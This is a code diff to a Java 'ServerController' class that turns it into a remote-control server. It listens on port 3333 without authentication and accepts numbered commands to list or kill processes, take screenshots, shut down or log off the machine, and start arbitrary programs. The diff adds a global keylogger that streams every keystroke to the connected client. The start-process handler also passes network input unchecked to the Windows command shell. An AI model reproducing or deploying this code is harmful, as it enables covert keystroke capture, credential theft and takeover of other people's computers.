@@ -6,43 +6,86 @@ import java.awt.Robot;
 import java.awt.image.BufferedImage;
 
 import java.io.*;
-import java.net.ServerSocket;
-import java.net.Socket;
+import java.net.*;
 import java.nio.ByteBuffer;
+
+import com.github.kwhat.jnativehook.*;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 public class ServerController {
 
     private BufferedWriter bw;
-
     private OutputStream outputStream;
 
-    public void openPort() throws IOException, AWTException, InterruptedException {
-        ServerSocket ss = new ServerSocket(3333);
-        Socket s = ss.accept();
-        outputStream = s.getOutputStream();
-        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
-        bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
-        int mode = Integer.parseInt(br.readLine());
-        while (mode != -1) {
-            switch (mode) {
-                case 1 -> getRunningProcesses();
-                case 2 ->
-                    //shutdown();
-                        System.out.println(1);
-                case 3 -> System.out.println(2);
-                case 4 -> getImage();
-                case 5 -> {
-                    String zs = br.readLine();
-                    kill(zs);
+    public class MyThread extends Thread {
+        public void run() {
+            try {
+                ServerSocket ss = new ServerSocket(3333);
+                Socket s = ss.accept();
+                outputStream = s.getOutputStream();
+                BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                bw = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));
+                int mode = Integer.parseInt(br.readLine());
+                while (mode != -1) {
+                    switch (mode) {
+                        case 1 -> getRunningProcesses();
+                        case 2 -> shutdown();
+                        case 3 -> logout();
+                        case 4 -> getImage();
+                        case 5 -> {
+                            String zs = br.readLine();
+                            kill(zs);
+                        }
+                        case 6 -> getRunningApplication();
+                        case 7 -> {
+                            String zs = br.readLine();
+                            startProcess(zs);
+                        }
+                        case 8 -> startKeylogger();
+                        case 9 -> stopKeylogger();
+                    }
+                    mode = Integer.parseInt(br.readLine());
                 }
-                case 6 -> getRunningApplication();
+                br.close();
+                s.close();
+                ss.close();
+            } catch (IOException | AWTException | NativeHookException e) {
+                throw new RuntimeException(e);
             }
-            mode = Integer.parseInt(br.readLine());
         }
-        br.close();
-        s.close();
-        ss.close();
     }
+
+    private final MyThread myThread = new MyThread();
+    public void openPort() {
+        myThread.start();
+    }
+
+    private NativeKeyListener nativeKeyListener = new NativeKeyListener() {
+        @Override
+        public void nativeKeyTyped(NativeKeyEvent nativeEvent)
+        {
+        }
+
+        @Override
+        public void nativeKeyReleased(NativeKeyEvent nativeEvent)
+        {
+            String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
+            System.out.println("User typed: "+keyText);
+            try {
+                bw.write(keyText);
+                bw.newLine();
+                bw.flush();
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+
+        @Override
+        public void nativeKeyPressed(NativeKeyEvent nativeEvent)
+        {
+        }
+    };
 
     public void getRunningProcesses() throws IOException {
         ProcessBuilder builder = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh");
@@ -92,8 +135,6 @@ public class ServerController {
             processBuilder.command("cmd", "/c" ,"shutdown -s");
             Process process = processBuilder.start();
             process.waitFor();
-            if(process.exitValue()==0){
-                System.out.println("Shut down");}
         }
         catch (Exception e)
         {
@@ -101,14 +142,10 @@ public class ServerController {
         }
     }
 
-    public void logout() throws Exception {
+    public void logout() throws IOException {
         ProcessBuilder processBuilder = new ProcessBuilder();
         processBuilder.command("cmd", "/c", "shutdown -l");
-        Process process = processBuilder.start();
-        process.waitFor();
-        if (process.exitValue() == 0) {
-            System.out.println("Shut down");
-        }
+        processBuilder.start();
     }
 
     public void getImage() throws IOException, AWTException {
@@ -132,8 +169,21 @@ public class ServerController {
         processBuilder.start();
     }
 
-    public void startProcess(String id)
+    public void startProcess(String name) throws IOException
     {
-
+        ProcessBuilder processBuilder = new ProcessBuilder();
+        processBuilder.command("cmd", "/c,", "start", name);
+        processBuilder.start();
+    }
+    public void startKeylogger() throws NativeHookException {
+        System.out.println("yespapi");
+        if (!GlobalScreen.isNativeHookRegistered())
+            GlobalScreen.registerNativeHook();
+        GlobalScreen.addNativeKeyListener(nativeKeyListener);
+    }
+    public void stopKeylogger() throws NativeHookException
+    {
+        System.out.println("nopapi");
+        GlobalScreen.removeNativeKeyListener(nativeKeyListener);
     }
 }
